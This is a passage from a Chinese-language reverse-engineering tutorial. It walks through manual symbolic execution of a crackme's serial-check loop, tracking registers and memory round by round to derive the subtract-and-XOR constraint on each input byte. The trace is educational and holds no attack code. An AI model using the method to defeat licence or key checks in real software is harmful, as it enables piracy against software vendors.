_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

</code></pre>
<p>对于var_10 的第一个结果,我们的求解思路如下:</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (xor(sub(*(add(var_10,var_14),1),0x55)) == *(add(_serial,var_14))) =&gt; (xor(sub(var_10_buffer_0,1),0x55)) == _serial_buffer_0)) =&gt; (xor(sub(x0,1),0x55)) == 0x31

</code></pre>
<p>继续分析程序,汇编代码如下:</p>
<pre><code class="language-assembly">
mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

</code></pre>
<p>我们可以看到,rdi 是可控的输入,var_14 是0 ,然后继续进行分析:</p>
<pre><code class="language-txt">
(Round1)

Code :

mov     [rbp+var_10], rdi         &lt;- Point
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi

Register Reference Table :

RAX : -1
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : -1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round2)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0           &lt;- Point
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0

Register Reference Table :

RAX : -1
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round3)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]         &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0

Register Reference Table :

RAX : p2
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round4)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round5)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]   &lt;- Point
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : p4
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round6)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1                    &lt;- Point
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : p5
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round7)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h                  &lt;- Point
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : p6
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round8)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial           &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial

Register Reference Table :

RAX : p7
RBX : -1
RCX : p3
RDX : p6
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round9)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round10)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]   &lt;- Point
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round11)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point ,Check EDX and ESI ..
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

</code></pre>
<p>我们对<code>cmp edx, esi</code> 进行组合,结果如下:</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (p6 == p9) =&gt; (xor(sub(*(add(p0,p1)),1),0x55) == (*(add(_serial,p1)))) =&gt; (xor(sub(*(add(rdi,0)),1),0x55) == (*(add(_serial,0)))) =&gt; (xor(sub(*(add(rdi,0)),1),0x55) == (0x31)) =&gt; (xor(sub(X1,1),0x55) == (0x31))

</code></pre>
<p>接下来我们继续往下执行.</p>
<pre><code class="language-txt">
(Round12)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1            &lt;- Point
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1

Register Reference Table :

RAX : p7
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round13)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]         &lt;- Point
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1

Register Reference Table :

RAX : p11
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round14)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1                    &lt;- Point
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)

Register Reference Table :

RAX : p12
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round15)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax         &lt;- Point
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12

Register Reference Table :

RAX : p12
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round16)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]         &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0

Register Reference Table :

RAX : p14
RBX : -1
RCX : p8
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round17)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p6
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round18)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]   &lt;- Point
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p16
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round19)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1                    &lt;- Point
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p17
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round20)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h                  &lt;- Point
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)

Register Reference Table :

RAX : p14
RBX : -1
RCX : p15
RDX : p18
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round21)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial           &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial

Register Reference Table :

RAX : p19
RBX : -1
RCX : p15
RDX : p18
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round22)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial
p20 = p13

Register Reference Table :

RAX : p19
RBX : -1
RCX : p20
RDX : p18
RSI : p9
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round23)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]   &lt;- Point
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial
p20 = p13
p21 = *(add(p19,p20))

Register Reference Table :

RAX : p19
RBX : -1
RCX : p20
RDX : p18
RSI : p21
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round24)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)
